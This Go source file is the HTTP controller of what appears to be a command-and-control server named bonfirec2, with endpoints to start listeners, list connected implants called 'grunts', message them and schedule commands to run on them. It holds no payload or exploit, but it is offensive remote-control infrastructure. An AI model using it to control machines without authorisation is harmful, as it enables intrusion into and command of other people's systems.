package controller

import (
	"log"
	"net/http"
	"strconv"
	"time"

	"github.com/Jojojojodr/bonfirec2"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func GetHealth(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status": "ok",
	})
}

func GetListeners(c *gin.Context) {
	listeners := make([]*bonfirec2.Listener, 0, len(bonfirec2.Listeners))
	for _, listener := range bonfirec2.Listeners {
		listeners = append(listeners, listener)
	}

	c.JSON(http.StatusOK, gin.H{
		"listeners": listeners,
	})
}

func CreateListener(c *gin.Context) {
	var req struct {
		Address  string `json:"address" binding:"required"`
		Port     string `json:"port" binding:"required"`
		Protocol string `json:"protocol" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	id := uuid.New().String()
	listener := bonfirec2.NewListener(id, req.Address, req.Port, req.Protocol)
	bonfirec2.Listeners[id] = listener

	go func() {
		if err := listener.Start(); err != nil {
			log.Printf("failed to start listener %s: %v", id, err)
		}
	}()

	c.JSON(http.StatusCreated, gin.H{
		"listener": listener,
	})
}

func GetGrunts(c *gin.Context) {
	grunts := make([]*bonfirec2.Grunt, 0, len(bonfirec2.Grunts))
	for _, grunt := range bonfirec2.Grunts {
		grunts = append(grunts, grunt)
	}

	c.JSON(http.StatusOK, gin.H{
		"grunts": grunts,
	})
}

func GetLatestMessages(c *gin.Context) {
	messages := bonfirec2.GetLatestMessages()
	c.JSON(http.StatusOK, gin.H{
		"messages": messages,
	})
}

func GetGruntMessages(c *gin.Context) {
	gruntID := c.Query("grunt_id")
	if gruntID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "grunt_id query parameter is required"})
		return
	}

	grunt := bonfirec2.Grunts[gruntID]
	if grunt == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "grunt not found"})
		return
	}

	messages, err := grunt.GetMessages()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"messages": messages,
	})
}

func SendGruntMessage(c *gin.Context) {
	var req struct {
		GruntID string `json:"grunt_id" binding:"required"`
		Content string `json:"content" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	grunt := bonfirec2.Grunts[req.GruntID]
	if grunt == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "grunt not found"})
		return
	}

	bonfirec2.SaveGruntMessage(grunt.ListenerID, grunt.ID, req.Content, true)

	c.JSON(http.StatusOK, gin.H{
		"message": "message sent successfully",
	})
}

func GetTasks(c *gin.Context) {
	tasks, err := bonfirec2.GetTasks()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"tasks": tasks})
}

func CreateTask(c *gin.Context) {
	var req struct {
		GruntID            string `json:"grunt_id" binding:"required"`
		Command            string `json:"command" binding:"required"`
		ScheduledFor       string `json:"scheduled_for" binding:"required"`
		Repeat             bool   `json:"repeat"`
		RepeatEverySeconds int    `json:"repeat_every_seconds"`
		RepeatCount        int    `json:"repeat_count"`
		Timeout            int    `json:"timeout"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if bonfirec2.Grunts[req.GruntID] == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "grunt not found"})
		return
	}

	scheduledFor, err := time.Parse(time.RFC3339, req.ScheduledFor)
	if err != nil {
		if scheduledFor, err = time.Parse("2006-01-02 15:04:05", req.ScheduledFor); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "scheduled_for must be RFC3339 or 2006-01-02 15:04:05"})
			return
		}
	}

	task, err := bonfirec2.NewTask(req.GruntID, req.Command, scheduledFor, req.Repeat, req.RepeatEverySeconds, req.RepeatCount, req.Timeout)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, gin.H{"task": task})
}


func GetNotifications(c *gin.Context) {
	limit := 20
	if rawLimit := c.Query("limit"); rawLimit != "" {
		parsedLimit, err := strconv.Atoi(rawLimit)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "limit must be an integer"})
			return
		}
		if parsedLimit > 0 {
			limit = parsedLimit
		}
	}

	if limit > 100 {
		limit = 100
	}

	notifications := bonfirec2.Notifications.Latest(limit)
	c.JSON(http.StatusOK, gin.H{"notifications": notifications})
}